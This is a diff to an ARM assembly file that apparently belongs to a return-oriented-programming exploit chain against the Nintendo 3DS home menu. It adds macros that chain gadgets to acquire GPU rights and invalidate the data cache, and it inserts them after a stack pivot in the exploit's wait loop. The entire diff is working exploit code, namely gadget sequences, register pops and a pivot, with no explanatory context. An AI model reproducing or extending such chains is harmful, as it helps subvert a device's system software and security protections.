@@ -13,6 +13,8 @@ MENU_CONNECTTOPORT equ ROP_MENU_CONNECTTOPORT
 
 MENU_NSS_LAUNCHTITLE equ ROP_MENU_NSS_LAUNCHTITLE ; r0 : out_ptr, r1 : unused ?, r2 : tidlow, r3 : tidhigh, sp_0 : flag
 MENU_GSPGPU_RELEASERIGHT equ ROP_MENU_GSPGPU_RELEASERIGHT ; r0 : handle addr
+MENU_GSPGPU_ACQUIRERIGHT equ ROP_MENU_GSPGPU_ACQUIRERIGHT ; r0 : handle addr
+MENU_GSPGPU_INVALIDATEDATACACHE equ ROP_MENU_GSPGPU_INVALIDATEDATACACHE ; r0 : gsp handle ptr, r1 : process handle, r2 : address, r3 : size
 MENU_GSPGPU_FLUSHDATACACHE equ ROP_MENU_GSPGPU_FLUSHDATACACHE ; r0 : gsp handle ptr, r1 : process handle, r2 : address, r3 : size
 MENU_GSPGPU_GXTRYENQUEUE equ ROP_MENU_GSPGPU_GXTRYENQUEUE ; r0 : interrupt receiver ptr, r1 : gx cmd data ptr
 MENU_MEMCPY equ ROP_MENU_MEMCPY ; r0 : dst, r1 : src, r2 : size
@@ -185,11 +187,33 @@ DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 		.word MENU_NOP ; pc
 .endmacro
 
+.macro gsp_acquire_right
+	set_lr MENU_NOP
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word MENU_GSPGPU_HANDLE ; r0 (gsp handle ptr)
+	.word MENU_GSPGPU_ACQUIRERIGHT
+.endmacro
+
 .macro gsp_release_right
 	set_lr MENU_NOP
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_GSPGPU_HANDLE ; r0 (gsp handle ptr)
 	.word MENU_GSPGPU_RELEASERIGHT
+.endmacro
+
+.macro invalidate_dcache,addr,size
+	set_lr MENU_NOP
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word MENU_GSPGPU_HANDLE ; r0 (handle ptr)
+	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
+		.word 0xFFFF8001 ; r1 (process handle)
+	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
+		.word addr ; r2 (addr)
+		.word size ; r3 (src)
+		.word 0xDEADBABE ; r4 (garbage)
+		.word 0xDEADBABE ; r5 (garbage)
+		.word 0xDEADBABE ; r6 (garbage)
+	.word MENU_GSPGPU_INVALIDATEDATACACHE
 .endmacro
 
 .macro flush_dcache,addr,size
@@ -376,6 +400,10 @@ DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 			.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 				.word WAITLOOP_DST + waitLoop_pivot_data - waitLoop_start + 4 ; r4
 			.word ROP_MENU_STACK_PIVOT
+				.word 0xBABEBAD0 ; marker
+				.word ROP_MENU_POP_R4R5PC ; rop gadget to replace pivot with
+			gsp_acquire_right
+			invalidate_dcache MENU_OBJECT_LOC, 0x003C0000
 	waitLoop_end:
 
 
